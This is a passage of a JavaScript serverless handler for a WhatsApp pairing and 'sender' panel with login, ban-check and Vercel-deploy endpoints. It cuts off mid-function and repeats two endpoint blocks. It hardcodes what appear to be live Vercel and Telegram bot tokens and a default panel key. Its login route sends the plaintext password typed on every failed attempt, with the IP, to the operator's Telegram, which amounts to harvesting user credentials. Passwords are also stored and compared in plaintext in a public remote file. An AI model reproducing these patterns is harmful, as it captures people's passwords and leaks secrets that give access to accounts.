/*
═════════════════════════════
            🔰 WANZ OFFICIAL               
══════════════════════════════
 ⚠️  JANGAN HAPUS CREDIT DEVELOPER
══════════════════════════════
 📱 WhatsApp : wa.me/6283898286223
 📸 Instagram : instagram.com/wan_xzyaa
═════════════════════════════
*/

import axios from "axios";
import formidable from "formidable";
import AdmZip from "adm-zip";
import fs from "fs";
import path from "path";

/* ====== CONFIG ====== */
const VERCEL_TOKEN = process.env.VERCEL_TOKEN || "HlRIJuNmRNT3YDtDOZPY4GHA";

const TELEGRAM_TOKEN = "8472435541:AAGuZmDev_j_zm5xbyW9p44dAIK8dNShJNw";
const OWNER_CHAT_ID = "7950114253";

/* ====== MAINTENANCE CONFIG ====== */
const IS_MAINTENANCE = false;
const BYPASS_ROLES = ["developer"];
export const INFO_TEXT = "Promo up reseller 60k pm 6283898206223";

const config = {
  domain: "http://wanzzzhostt.kantinvps.my.id",
  port: 3002,
  creator: "Wanz Official",
};
const base = `${config.domain}:${config.port}`;

const axiosOpt = {
  headers: { "Content-Type": "application/json" },
  timeout: 20000,
  validateStatus: () => true,
};


const REMOTE_USERS_URL = process.env.REMOTE_USERS_URL
  || "https://raw.githubusercontent.com/xcvisimilarity-latest/xcvidatabase/refs/heads/main/xcvifree.json";



// ===== users cache (short TTL to keep reads near-real-time) =====
let __usersCache = {
  ts: 0,
  ttl: 3 * 1000, // 3 seconds by default
  data: null
};

function getUsersCache() {
  if (__usersCache.data && (Date.now() - __usersCache.ts) < (__usersCache.ttl || 3000)) return __usersCache.data;
  return null;
}
function setUsersCache(data) {
  __usersCache = { ts: Date.now(), ttl: __usersCache.ttl || 3000, data };
}

// tolerant JSON parse helper (small, local)
function tryParseJson(text) {
  if (!text) return null;
  try {
    return JSON.parse(text);
  } catch (_) {
    // try to do minimal fixing: replace single quotes and quote unquoted keys
    try {
      let fixed = String(text).replace(/([{,]\s*)([-A-Za-z0-9_$]+)\s*:/g, '$1"$2":');
      fixed = fixed.replace(/'/g, '"');
      return JSON.parse(fixed);
    } catch (_) {
      // try extract array/object substring
      const arrMatch = String(text).match(/\[.*\]/s);
      if (arrMatch) {
        try { return JSON.parse(arrMatch[0]); } catch (_) {}
      }
      const objMatch = String(text).match(/\{.*\}/s);
      if (objMatch) {
        try { return JSON.parse(objMatch[0]); } catch (_) {}
      }
    }
  }
  return null;
}

// improved loadUsersRemote with cache-buster + retries + GitHub API fallback
async function loadUsersRemote() {
  const nowTs = Date.now();

  // quick cache hit
  const cached = getUsersCache();
  if (cached) {
    // console.log('[connect] Returning cached users (TTL hit) -', cached.length);
    return cached;
  }

  // build URL: if raw.githubusercontent, add cache-buster param to avoid CDN stale
  let url = REMOTE_USERS_URL;
  if (typeof url === 'string' && url.includes('raw.githubusercontent.com')) {
    url = url + (url.includes('?') ? '&' : '?') + 't=' + Date.now();
    // console.log('[connect] Using cache-busted raw URL:', url);
  }

  // try a few attempts for robustness
  let lastErr = null;
  const ATTEMPTS = 3;
  for (let i = 0; i < ATTEMPTS; i++) {
    try {
      const resp = await axios.get(url, { timeout: 10000, validateStatus: () => true });
      if (resp && resp.status === 200) {
        // try to ensure data is array (axios may parse JSON automatically)
        let data = resp.data;
        if (!Array.isArray(data)) {
          // if resp.data is string, try tolerant parse
          if (typeof data === 'string') data = tryParseJson(data);
        }
        if (Array.isArray(data)) {
          // set cache with consistent ttl
          setUsersCache(data);
          return data;
        } else {
          lastErr = new Error(`Remote returned non-array payload (status ${resp.status})`);
        }
      } else {
        lastErr = new Error(`HTTP ${resp ? resp.status : 'NO_RESP'} from remote users`);
      }
    } catch (e) {
      lastErr = e;
    }
    // wait small delay before retry
    await new Promise(r => setTimeout(r, 400));
  }

  // Fallback: try GitHub API /contents (more authoritative; handles refs/heads)
  try {
    if (typeof REMOTE_USERS_URL === 'string' && REMOTE_USERS_URL.includes('raw.githubusercontent.com')) {
      // pattern: raw.githubusercontent.com/owner/repo/... (rest can include refs/heads/branch/path)
      const m = REMOTE_USERS_URL.match(/raw\.githubusercontent\.com\/([^/]+)\/([^/]+)\/(.+)/);
      if (m) {
        const owner = m[1], repo = m[2];
        let rest = m[3];
        if (rest.startsWith('refs/heads/')) rest = rest.slice('refs/heads/'.length);
        // handle case where rest accidentally contains starting branch name only
        const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${rest}`;
        // console.log('[connect] Trying GitHub API fallback:', apiUrl);

        const token = process.env.GITHUB_TOKEN || global.GITHUB_TOKEN;
        const headers = { Accept: 'application/vnd.github.v3+json', 'User-Agent': 'connect-loadUsersRemote' };
        if (token) headers.Authorization = `token ${token}`;

        const apiResp = await axios.get(apiUrl, {
          headers,
          timeout: 10000,
          validateStatus: () => true
        });

        if (apiResp && apiResp.status === 200 && apiResp.data && apiResp.data.content) {
          const content = Buffer.from(apiResp.data.content || '', 'base64').toString('utf8');
          const parsed = tryParseJson(content);
          if (Array.isArray(parsed)) {
            setUsersCache(parsed);
            return parsed;
          } else {
            lastErr = new Error('GitHub API returned content but not array');
          }
        } else {
          lastErr = new Error(`GitHub API fallback HTTP ${apiResp ? apiResp.status : 'NO_RESP'}`);
        }
      } else {
        lastErr = new Error('Could not parse raw.githubusercontent URL');
      }
    }
  } catch (e) {
    console.warn('[connect] GitHub API fallback failed:', String(e?.message || e));
  }

  // all failed
  throw lastErr || new Error('Failed to load remote users');
}


async function fetchUserByUsername(username) {
  try {
    if (!username) return null;
    const list = await loadUsersRemote();
    if (!Array.isArray(list)) return null;
    const uname = String(username).toLowerCase();
    return list.find(u => String(u.username || "").toLowerCase() === uname) || null;
  } catch (e) {
    console.warn('[connect] fetchUserByUsername error:', String(e?.message || e));
    return null;
  }
}

/* ====== HELPERS ====== */
function parseBody(req) {
  try {
    if (!req) return {};
    if (typeof req.body === "object") return req.body || {};
    if (typeof req.body === "string") return JSON.parse(req.body);
    if (Buffer.isBuffer(req.body)) return JSON.parse(req.body.toString());
    return {};
  } catch {
    return {};
  }
}


async function notifyOwnerTelegram(text) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: OWNER_CHAT_ID,
      text,
      parse_mode: "Markdown"
    }, { timeout: 10000 });
  } catch (e) {
    console.warn("notifyOwnerTelegram failed:", e && e.message);
  }
}

/* ====== EXPORT HANDLER ====== */
export default async function handler(req, res) {
  const method = (req.method || "GET").toUpperCase();
  const path = req.url || "";

  try {
    // ---------- STATUS (original) ----------
    if (
      method === "GET" &&
      !path.includes("pair") &&
      !path.includes("disconnect") &&
      !path.includes("send") &&
      !path.includes("login") &&
      !path.includes("users") &&
      !path.includes("senders") &&
      !path.includes("create-account") &&
      !path.includes("system-stats") &&
      !path.includes("session-details") &&
      !path.includes("performance") &&
      !path.includes("dashboard")
    ) {
      const resp = await axios.get(`${base}/status`, axiosOpt);
      const data = resp.data || {};
      return res.status(200).json({
  ok: true,
  maintenance: IS_MAINTENANCE,
  status: data.ok || data.status === "online" ? "online" : data.status || "offline",
  raw: data,
  creator: config.creator,
  info: INFO_TEXT,
});
    }

    // ---------- GET USERS (debug/admin) ----------
   // ---------- USERS (fixed & secured) ----------
// ========== USERS (Final Secure & Flexible Version) ==========
if (method === "POST" && path.includes("users")) {
  try {
    // --- validasi asal domain (lebih fleksibel) ---
    let origin = (req.headers.origin || "").replace(/\/$/, ""); // hapus trailing slash
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];

    // deteksi kecocokan domain
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));

    // jika origin terdeteksi tapi tidak termasuk whitelist
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    // --- validasi opsional tambahan (token admin) ---
    const token = req.headers["x-panel-key"];
    const validToken = process.env.PANEL_KEY || "WanzSecureKey123"; // ganti di .env kalau perlu
    if (token !== validToken) {
      return res.status(401).json({
        ok: false,
        error: "Invalid panel key",
        creator: config.creator,
      });
    }

    // --- ambil daftar user dari remote dan filter aman untuk ditampilkan ---
let list;
try {
  list = await loadUsersRemote();
  if (!Array.isArray(list)) throw new Error("Remote users bukan array");
} catch (e) {
  console.error("[USERS] Gagal memuat remote users:", e && e.message);
  return res.status(500).json({
    ok: false,
    error: "Gagal memuat data user dari sumber remote",
    creator: config.creator,
  });
}

const safe = list.map((u) => ({
  username: u.username,
  role: u.role,
  disabled: !!u.disabled,
  failedAttempts: u.failedAttempts || 0,
  lockUntil: u.lockUntil || 0,
  createdAt: u.createdAt,
  expired: u.expired,
}));

    return res.status(200).json({
      ok: true,
      count: safe.length,
      users: safe,
      creator: config.creator,
    });

  } catch (err) {
    console.error("USERS error:", err);
    return res.status(500).json({
      ok: false,
      error: "Gagal memuat data user",
      creator: config.creator,
    });
  }
}

// ====== DEPLOY TO VERCEL (FINAL FIX 2025) ======
if (method === "POST" && path.includes("deploy-vercel")) {
  const nodePath = await import("path");
  const os = await import("os");
  const PATH = nodePath.default;
  const MAX_UPLOAD_BYTES = 15 * 1024 * 1024;
  const safeRm = (p) => { try { fs.rmSync(p, { recursive: true, force: true }); } catch {} };

  try {
    const uploadDir = PATH.join(os.tmpdir(), "uploads");
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

    const form = formidable({
      multiples: false,
      keepExtensions: true,
      maxFileSize: MAX_UPLOAD_BYTES,
      uploadDir
    });

    // === Parsing form ===
    const { fields, files } = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => err ? reject(err) : resolve({ fields, files }));
    });

    // === Ambil nama project (domain) ===
    let domainRaw = Array.isArray(fields.domain) ? fields.domain[0] : fields.domain;
    domainRaw = (domainRaw || "").toString().trim()
      .replace(/^https?:\/\//i, "")
      .replace(/^www\./i, "")
      .replace(/\.vercel\.app$/i, "");
    if (!domainRaw) {
      return res.status(400).json({ ok: false, error: "Nama domain (project) wajib diisi." });
    }

    // === Validasi file upload ===
    const uploadFile = Array.isArray(files.file) ? files.file[0] : files.file;
    if (!uploadFile?.filepath || !fs.existsSync(uploadFile.filepath)) {
      return res.status(400).json({ ok: false, error: "File tidak ditemukan di server." });
    }

    const filePath = uploadFile.filepath;
    const fname = (uploadFile.originalFilename || "").toLowerCase();

    // === Ekstraksi ZIP atau HTML tunggal ===
    const tempDir = PATH.join(os.tmpdir(), `vercel-deploy-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    fs.mkdirSync(tempDir, { recursive: true });

    if (fname.endsWith(".zip")) {
      const AdmZip = (await import("adm-zip")).default;
      const zip = new AdmZip(filePath);
      const entries = zip.getEntries();
      if (!entries.length)
        return res.status(400).json({ ok: false, error: "ZIP kosong atau rusak." });

      const hasIndex = entries.some(e => e.entryName.toLowerCase().endsWith("index.html"));
      if (!hasIndex)
        return res.status(400).json({ ok: false, error: "ZIP harus berisi index.html." });

      zip.extractAllTo(tempDir, true);
    } else {
      if (!fname.endsWith(".html"))
        return res.status(400).json({ ok: false, error: "Hanya index.html atau ZIP yang diizinkan." });
      fs.copyFileSync(filePath, PATH.join(tempDir, "index.html"));
    }

    // === Kumpulkan semua file ===
    const collectFiles = (dir) => {
      let result = [];
      for (const name of fs.readdirSync(dir)) {
        const full = PATH.join(dir, name);
        const stat = fs.statSync(full);
        if (stat.isDirectory()) result = result.concat(collectFiles(full));
        else {
          const rel = PATH.relative(tempDir, full).replace(/\\/g, "/");
          const data = fs.readFileSync(full, "utf-8");
          result.push({ file: rel, data });
        }
      }
      return result;
    };

    const allFiles = collectFiles(tempDir);
    if (!allFiles.some(f => f.file.toLowerCase().endsWith("index.html"))) {
      safeRm(tempDir);
      return res.status(400).json({ ok: false, error: "index.html tidak ditemukan di dalam ZIP atau folder." });
    }

    // === Cek atau buat project ===
    let projectId = null;
    try {
      const projects = await axios.get(
        `https://api.vercel.com/v9/projects?search=${domainRaw}`,
        { headers: { Authorization: `Bearer ${VERCEL_TOKEN}` } }
      );

      const found = projects.data?.projects?.find(p => p.name === domainRaw);
      if (found) {
        projectId = found.id;
      } else {
        const newProj = await axios.post(
          "https://api.vercel.com/v9/projects",
          {
            name: domainRaw,
            framework: null,
            buildCommand: "",
            devCommand: "",
            outputDirectory: "",
            rootDirectory: null
          },
          { headers: { Authorization: `Bearer ${VERCEL_TOKEN}` } }
        );
        projectId = newProj.data.id;
      }
    } catch (err) {
      const msg = err.response?.data?.error?.message || err.message;
      return res.status(500).json({ ok: false, error: `Gagal membuat project di Vercel: ${msg}` });
    }

    // === Deploy ===
    let deployResp;
    try {
      deployResp = await axios.post(
        `https://api.vercel.com/v13/deployments?projectId=${projectId}`,
        {
          name: domainRaw,
          target: "production",
          files: allFiles
        },
        { headers: { Authorization: `Bearer ${VERCEL_TOKEN}` } }
      );
    } catch (err) {
      const msg = err.response?.data?.error?.message || err.message;
      return res.status(500).json({ ok: false, error: `Gagal deploy ke Vercel: ${msg}` });
    }

    const deployData = deployResp.data || {};
    let deployUrl = null;

    // === Ambil domain final ===
    if (deployData.url) {
      deployUrl = deployData.url.startsWith("http") ? deployData.url : `https://${deployData.url}`;
    }

    // kalau belum ada URL → fetch detail deployment
    if (!deployUrl && deployData.id) {
      try {
        const detail = await axios.get(
          `https://api.vercel.com/v13/deployments/${deployData.id}`,
          { headers: { Authorization: `Bearer ${VERCEL_TOKEN}` } }
        );
        const dd = detail.data;
        if (dd?.url) deployUrl = `https://${dd.url}`;
        else if (Array.isArray(dd.aliases) && dd.aliases.length > 0)
          deployUrl = `https://${dd.aliases[0]}`;
      } catch (e) {
        console.warn("[DEPLOY] Gagal ambil detail deployment:", e.message);
      }
    }

    // fallback terakhir
    if (!deployUrl) deployUrl = `https://${domainRaw}.vercel.app`;

    // === Cleanup ===
    safeRm(tempDir);
    try { fs.unlinkSync(filePath); } catch {}

    // === Response sukses ===
    return res.status(200).json({
      ok: true,
      message: "Deploy ke Vercel berhasil 🚀",
      projectId,
      deployUrl,
      vercelResponse: deployData
    });

  } catch (err) {
    console.error("Deploy error:", err.response?.data || err.message);
    return res.status(500).json({
      ok: false,
      error: err.response?.data?.error?.message || err.message || "Gagal melakukan deploy ke Vercel"
    });
  }
}


/* ===================================== 
🌐  SENDER GLOBAL FEATURE             
===================================== */
if (method === "POST" && path.includes("senders")) {
  const body = parseBody(req);
  const owner = body.owner || (body.user && body.user.username) || null;

  try {
    const resp = await axios.post(`${base}/global-senders`, { owner }, axiosOpt);
    console.log('[CONNECT] /senders called, owner:', owner, 'body:', body);
    const data = resp.data || {};

    return res.status(resp.status).json({
      ok: !!data.ok,
      senders: data.senders || [],
      error: data.error || null,
      message: data.message || "Daftar sender global berhasil diambil",
      creator: config.creator,
      raw: data,
    });
  } catch (err) {
    console.error("[connect:/senders] Error:", err.message);
    return res.status(500).json({
      ok: false,
      senders: [],
      error: err.message,
      creator: config.creator,
    });
  }
}

if (method === "POST" && path.includes("out-sender")) {
  const body = parseBody(req);
  const { name, phone } = body;

  if (!name || !phone)
    return res.status(400).json({
      ok: false,
      error: "Parameter name & phone wajib diisi",
      creator: config.creator,
    });

  try {
    const resp = await axios.post(`${base}/out-sender`, { name, phone }, axiosOpt);
    const data = resp.data || {};

    return res.status(resp.status).json({
      ok: !!data.ok,
      message: data.message || "Berhasil keluar dari sender global",
      error: data.error || null,
      creator: config.creator,
      raw: data,
    });
  } catch (err) {
    console.error("[connect:/out-sender] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message,
      creator: config.creator,
    });
  }
}


// ========== REAL-TIME MONITORING ENDPOINTS ==========

// --- SYSTEM STATS PROXY ---
if (method === "GET" && path.includes("system-stats")) {
  try {
    const resp = await axios.get(`${base}/system-stats`, axiosOpt);
    const data = resp.data || {};
    
    return res.status(resp.status).json({
      ok: !!data.ok,
      system: data,
      creator: config.creator
    });
  } catch (err) {
    console.error("[SYSTEM-STATS] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: "Gagal mengambil data sistem",
      creator: config.creator
    });
  }
}

// --- SESSION DETAILS PROXY ---
if (method === "GET" && path.includes("session-details")) {
  try {
    const resp = await axios.get(`${base}/session-details`, axiosOpt);
    const data = resp.data || {};
    
    return res.status(resp.status).json({
      ok: !!data.ok,
      sessions: data.sessions || [],
      stats: {
        total: data.total || 0,
        connected: data.connected || 0
      },
      creator: config.creator
    });
  } catch (err) {
    console.error("[SESSION-DETAILS] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: "Gagal mengambil detail session",
      creator: config.creator
    });
  }
}

// --- PERFORMANCE METRICS PROXY ---
if (method === "GET" && path.includes("performance")) {
  try {
    const resp = await axios.get(`${base}/performance`, axiosOpt);
    const data = resp.data || {};
    
    return res.status(resp.status).json({
      ok: !!data.ok,
      performance: data.metrics || {},
      creator: config.creator
    });
  } catch (err) {
    console.error("[PERFORMANCE] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: "Gagal mengambil metrik performa",
      creator: config.creator
    });
  }
}

// --- COMPREHENSIVE DASHBOARD DATA ---
if (method === "GET" && path.includes("dashboard")) {
  try {
    // Fetch all data in parallel
    const [systemResp, sessionsResp, performanceResp, usersResp] = await Promise.all([
      axios.get(`${base}/system-stats`, axiosOpt).catch(() => ({ data: {} })),
      axios.get(`${base}/session-details`, axiosOpt).catch(() => ({ data: {} })),
      axios.get(`${base}/performance`, axiosOpt).catch(() => ({ data: {} })),
      loadUsersRemote().catch(() => [])
    ]);

    const comprehensiveData = {
      ok: true,
      timestamp: Date.now(),
      system: systemResp.data || {},
      sessions: sessionsResp.data || {},
      performance: performanceResp.data || {},
      users: {
        total: Array.isArray(usersResp) ? usersResp.length : 0,
        active: Array.isArray(usersResp) ? usersResp.filter(u => !u.disabled).length : 0
      },
      creator: config.creator,
      info: INFO_TEXT
    };

    return res.status(200).json(comprehensiveData);
  } catch (err) {
    console.error("[DASHBOARD] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: "Gagal mengambil data dashboard lengkap",
      creator: config.creator
    });
  }
}

    // ---------- LOGIN (new) ----------
    // ---------- LOGIN (new & strict) ----------
// ---------- LOGIN (fixed + notify on fail) ----------
if (method === "POST" && path.includes("login")) {
  const body = await parseBody(req);
  const { username, password } = body || {};

  if (!username || !password) {
    return res.status(400).json({
      ok: false,
      error: "username & password required",
      creator: config.creator
    });
  }

  let user;
try {
  user = await fetchUserByUsername(username);
} catch (e) {
  console.error("[LOGIN] Gagal ambil data user remote:", e && e.message);
  return res.status(502).json({
    ok: false,
    error: "Gagal memuat data user — coba lagi nanti",
    creator: config.creator,
  });
}
  const now = Date.now();

  /* 🚨 USERNAME TIDAK DITEMUKAN */
  if (!user) {
    await new Promise(r => setTimeout(r, 450));
    await notifyOwnerTelegram(
      `⚠️ *Percobaan Login Gagal*\nUsername: *${username}* (tidak terdaftar)\nPassword: \`${password}\`\nIP: ${req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown"}\nTime: ${new Date().toISOString()}`
    );
    return res.status(401).json({
      ok: false,
      error: "Username atau password salah!",
      creator: config.creator
    });
  }

  /* 🔒 CEK STATUS AKUN NONAKTIF */
  if (user.disabled) {
    await notifyOwnerTelegram(
      `⚠️ *Akses Ditolak*\nAkun *${user.username}* mencoba login namun status: *Nonaktif*.\nTime: ${new Date().toISOString()}`
    );
    return res.status(403).json({
      ok: false,
      error: "Akun ini dinonaktifkan oleh admin",
      creator: config.creator
    });
  }

  /* 🔒 CEK LOCK / BLOKIR SEMENTARA */
  if (user.lockUntil && user.lockUntil > now) {
    const remaining = Math.ceil((user.lockUntil - now) / 1000);
    return res.status(423).json({
      ok: false,
      error: `Akun dikunci. Coba lagi dalam ${remaining}s`,
      lockUntil: user.lockUntil,
      creator: config.creator
    });
  }

  // ⚠️ CEK PASSWORD (plaintext demo)
  const match = String(password).trim() === String(user.password).trim();

  if (!match) {
    user.failedAttempts = (user.failedAttempts || 0) + 1;

    const MAX_FAIL = 3;
    const LOCK_MS = 10 * 60 * 1000; // 10 menit

    // kalau gagal sampai batas maksimal
    if (user.failedAttempts >= MAX_FAIL) {
      user.lockUntil = now + LOCK_MS;
      user.failedAttempts = 0;
      await notifyOwnerTelegram(
        `🚨 *Security Alert*\nAkun *${user.username}* dikunci selama 10 menit karena gagal login berulang.\nTime: ${new Date().toISOString()}`
      );
      return res.status(423).json({
        ok: false,
        error: `Akun dikunci selama ${Math.round(LOCK_MS / 60000)} menit.`,
        creator: config.creator
      });
    }

    // kirim notifikasi setiap kali salah password
    await notifyOwnerTelegram(
      `⚠️ *Login Gagal*\nUser: *${user.username}*\nPassword Salah: \`${password}\`\nPercobaan ke-${user.failedAttempts}/${MAX_FAIL}\nIP: ${req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown"}\nTime: ${new Date().toISOString()}`
    );

    return res.status(401).json({
      ok: false,
      error: "Username atau password salah!",
      attemptsLeft: Math.max(0, MAX_FAIL - user.failedAttempts),
      creator: config.creator
    });
  }

  /* ✅ LOGIN SUKSES */
  user.failedAttempts = 0;
  user.lockUntil = 0;

  const auth = {
    username: user.username,
    role: user.role,
    createdAt: user.createdAt,
    expired: user.expired,
    status: user.disabled ? "nonaktif" : "aktif",
    loggedAt: Date.now()
  };

  await notifyOwnerTelegram(
    `✅ *Login Berhasil*\nUser: *${user.username}*\nRole: *${user.role}*\nStatus: *Aktif*\nIP: ${req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown"}\nTime: ${new Date().toISOString()}`
  );

  const bypass = BYPASS_ROLES.includes(user.role);
return res.status(200).json({
  ok: true,
  maintenance: IS_MAINTENANCE,
  maintenance_bypass: bypass,
  auth,
  message: "Login berhasil",
  creator: config.creator
});
}

// ========== PAIR SYSTEM (Final Flexible + Secure) ==========
const PAIR_COOLDOWN_MS = 5 * 60 * 1000; // 5 menit cooldown antar pairing
const BAN_DURATION_MS = 60 * 60 * 1000; // 1 jam untuk IP/UA yang diban
const RAPID_TRY_LIMIT = 5;              // percobaan cepat sebelum auto-ban
const RAPID_TRY_WINDOW_MS = 60 * 1000;  // jendela 1 menit untuk hitung spam

// cache global biar nggak reset di hot reload
const cooldowns = global.__pairCooldowns || new Map();       
const processingSet = global.__pairProcessing || new Set();  
const requestCounts = global.__pairReqCounts || new Map();  
const banList = global.__pairBanList || new Map();

global.__pairCooldowns = cooldowns;
global.__pairProcessing = processingSet;
global.__pairReqCounts = requestCounts;
global.__pairBanList = banList;

if (method === "POST" && path.includes("pair")) {
  try {
    // --- origin validation (lebih fleksibel) ---
    let origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
      "https://xcvifree.vercel.app",
    ];

    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));
    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    // --- identitas client ---
    const ip = (req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "")
      .split(",")[0].trim() || "unknown";
    const ua = (req.headers["user-agent"] || "unknown").slice(0, 300);
    const callerKey = `${ip}::${ua}`;

    // --- cek ban aktif ---
    const now = Date.now();
    const banUntil = banList.get(ip) || banList.get(ua) || 0;

    // --- ambil body ---
    const body = await parseBody(req);
    const { name, phone, owner } = body || {};
if (!phone) {
  return res.status(400).json({
    ok: false,
    error: "Phone wajib diisi",
    creator: config.creator,
  });
}
    
    



    // --- jika nomor sedang diproses ---
    if (processingSet.has(phone)) {
      const arr = requestCounts.get(callerKey) || [];
      arr.push(now);
      const recent = arr.filter(t => now - t < RAPID_TRY_WINDOW_MS);
      requestCounts.set(callerKey, recent);

      if (recent.length >= RAPID_TRY_LIMIT) {
        const until = now + BAN_DURATION_MS;
        banList.set(ip, until);
        banList.set(ua, until);
        await notifyOwnerTelegram(
          `🚨 *Auto-Ban Activated*\nToo many rapid attempts.\nIP: ${ip}\nUA: ${ua}\nPhone: ${phone}\nBanUntil: ${new Date(until).toLocaleString()}`
        );
        return res.status(403).json({
          ok: false,
          error: "Too many requests. You are temporarily banned.",
          creator: config.creator,
        });
      }

      return res.status(429).json({
        ok: false,
        error: "Nomor sedang diproses, coba beberapa detik lagi",
        creator: config.creator,
      });
    }

    // --- cek cooldown ---
    const cooldownEnd = cooldowns.get(phone) || 0;
    if (cooldownEnd && now < cooldownEnd) {
      await notifyOwnerTelegram(
        `⚠️ *Blocked Pairing (Cooldown)*\nPhone: ${phone}\nAttempted by: ${name || "unknown"}\nIP: ${ip}\nUA: ${ua}\nCooldown ends: ${new Date(cooldownEnd).toLocaleString()}`
      );

      const arr = requestCounts.get(callerKey) || [];
      arr.push(now);
      const recent = arr.filter(t => now - t < RAPID_TRY_WINDOW_MS);
      requestCounts.set(callerKey, recent);
      if (recent.length >= RAPID_TRY_LIMIT) {
        const until = now + BAN_DURATION_MS;
        banList.set(ip, until);
        banList.set(ua, until);
        await notifyOwnerTelegram(
          `🚨 *Auto-Ban Activated*\nToo many blocked cooldown attempts.\nIP: ${ip}\nUA: ${ua}\nPhone: ${phone}\nBanUntil: ${new Date(until).toLocaleString()}`
        );
        return res.status(403).json({
          ok: false,
          error: "Too many requests. You are temporarily banned.",
          creator: config.creator,
        });
      }

      return res.status(429).json({
        ok: false,
        error: `Nomor sedang cooldown. Coba lagi setelah ${Math.ceil(
          (cooldownEnd - now) / 1000
        )} detik`,
        creator: config.creator,
      });
    }

    // tandai sedang diproses
    processingSet.add(phone);

    // --- panggil backend pairing ---
    let resp;
    try {
const safeOwner = owner || (body && body.owner) || (name || 'unknown');
resp = await axios.post(`${base}/pair`, { name, phone, owner: safeOwner }, axiosOpt);
    } catch (err) {
      processingSet.delete(phone);
      console.error("PAIR axios error:", err && (err.message || err));
      return res.status(502).json({
        ok: false,
        error: "Gagal hubungi backend pairing",
        creator: config.creator,
      });
    }

    const data = resp.data || {};
    if (resp.status === 404) {
      processingSet.delete(phone);
      return res.status(404).json({
        ok: false,
        error: "Endpoint pair tidak ditemukan",
        creator: config.creator,
      });
    }

    // --- jika sukses ---
    if (data.ok || data.pairing_code) {
      cooldowns.set(phone, Date.now() + PAIR_COOLDOWN_MS);
      requestCounts.delete(callerKey);
      await notifyOwnerTelegram(
        `✅ *Pairing Created*\nPhone: ${phone}\nBy: ${name || "unknown"}\nIP: ${ip}\nUA: ${ua}\nCode: ${data.pairing_code || data.code || "N/A"}`
      );
      processingSet.delete(phone);

      return res.status(resp.status).json({
        ok: !!data.ok,
        name,
        phone,
        pairing_code: data.pairing_code || data.code || null,
        message: data.message || null,
        error: data.error || null,
        creator: config.creator,
        raw: data,
      });
    } else {
      processingSet.delete(phone);
      await notifyOwnerTelegram(
        `⚠️ *Pairing Failed*\nPhone: ${phone}\nBy: ${name || "unknown"}\nIP: ${ip}\nUA: ${ua}\nError: ${data.error || "unknown"}`
      );
      return res.status(resp.status).json({
        ok: false,
        error: data.error || "Pairing failed",
        creator: config.creator,
        raw: data,
      });
    }

  } catch (err) {
    console.error("PAIR error:", err && (err.message || err));
    return res.status(500).json({
      ok: false,
      error: "Gagal melakukan pairing. Periksa koneksi server.",
      creator: config.creator,
    });
  }
}


    // ---------- DISCONNECT (existing) ----------
    if (method === "POST" && path.includes("disconnect")) {
      const body = parseBody(req);
      const { name, phone } = body;

      if (!name || !phone)
        return res.status(400).json({ ok: false, error: "Parameter name & phone wajib diisi", creator: config.creator });

      const resp = await axios.post(`${base}/disconnect`, { name, phone }, axiosOpt);
      const data = resp.data || {};

      return res.status(resp.status).json({
        ok: !!data.ok,
        message: data.message || "Disconnected",
        error: data.error || null,
        creator: config.creator,
        raw: data,
      });
    }




/* ===================================== 
🌐  SENDER GLOBAL FEATURE             
===================================== */
if (method === "POST" && path.includes("senders")) {
  const body = parseBody(req);
  const owner = body.owner || (body.user && body.user.username) || null;

  try {
    const resp = await axios.post(`${base}/global-senders`, { owner }, axiosOpt);
    console.log('[CONNECT] /senders called, owner:', owner, 'body:', body);
    const data = resp.data || {};

    return res.status(resp.status).json({
      ok: !!data.ok,
      senders: data.senders || [],
      error: data.error || null,
      message: data.message || "Daftar sender global berhasil diambil",
      creator: config.creator,
      raw: data,
    });
  } catch (err) {
    console.error("[connect:/senders] Error:", err.message);
    return res.status(500).json({
      ok: false,
      senders: [],
      error: err.message,
      creator: config.creator,
    });
  }
}

if (method === "POST" && path.includes("out-sender")) {
  const body = parseBody(req);
  const { name, phone } = body;

  if (!name || !phone)
    return res.status(400).json({
      ok: false,
      error: "Parameter name & phone wajib diisi",
      creator: config.creator,
    });

  try {
    const resp = await axios.post(`${base}/out-sender`, { name, phone }, axiosOpt);
    const data = resp.data || {};

    return res.status(resp.status).json({
      ok: !!data.ok,
      message: data.message || "Berhasil keluar dari sender global",
      error: data.error || null,
      creator: config.creator,
      raw: data,
    });
  } catch (err) {
    console.error("[connect:/out-sender] Error:", err.message);
    return res.status(500).json({
      ok: false,
      error: err.message,
      creator: config.creator,
    });
  }
}

// ---------- CEKBAN (Proxy ke wanzdev.js) ----------
if (method === "POST" && path.includes("cekban") && !path.includes("senders")) {
  try {
    const origin = (req.headers.origin || "").replace(/\/$/, "");
    const allowedOrigins = [
    "https://xcvifree.vercel.app",
    ];
    const isAllowed = allowedOrigins.some(o => origin.startsWith(o));

    if (origin && !isAllowed) {
      return res.status(403).json({
        ok: false,
        error: `Unauthorized access from ${origin}`,
        creator: config.creator,
      });
    }

    const body = await parseBody(req);
    const { phone } = body || {};

    if (!phone) {
      return res.status(400).json({
        ok: false,
        error: "Parameter 'phone' wajib diisi",
        creator: config.creator,
      });
    }

    const cleanPhone = String(phone).replace(/\D/g, "");

    // Forward ke backend utama (wanzdev.js)
    let resp;
    try {
      resp = await axios.post(`${base}/cekban`, { number: cleanPhone }, axiosOpt);
    } catch (err) {
